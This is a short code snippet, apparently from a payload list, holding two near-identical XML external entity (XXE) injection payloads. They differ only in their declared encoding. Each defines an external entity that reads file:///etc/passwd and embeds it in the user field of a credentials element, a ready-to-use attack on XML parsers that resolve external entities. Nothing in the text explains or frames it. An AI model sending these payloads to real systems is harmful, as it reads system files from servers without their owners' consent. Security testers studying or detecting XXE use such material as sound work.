```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY NyaMeeEain SYSTEM "file:///etc/passwd" >]>
<creds><user>&NyaMeeEain;</user><pass>mypass</pass></creds>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY NyaMeeEain SYSTEM "file:///etc/passwd" >]>
<creds><user>&NyaMeeEain;</user><pass>mypass</pass></creds>

```
```
